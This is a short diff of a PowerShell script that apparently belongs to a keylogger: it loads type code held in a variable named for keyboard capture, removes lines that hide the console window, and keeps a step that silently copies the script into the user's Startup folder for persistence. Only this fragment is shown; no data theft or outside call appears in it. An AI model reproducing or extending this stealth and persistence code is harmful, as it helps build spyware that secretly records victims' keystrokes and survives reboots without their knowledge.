@@ -15,10 +15,6 @@ public class K {
 '@
 Add-Type -TypeDefinition $keyboardCode
 
-# Hide console window immediately
-$consolePtr = [K]::GetConsoleWindow()
-[K]::ShowWindow($consolePtr, 0)
-
 # Silent self-copy to Startup folder
 $startupPath = [Environment]::GetFolderPath('Startup')
 $currentScript = $MyInvocation.MyCommand.Path
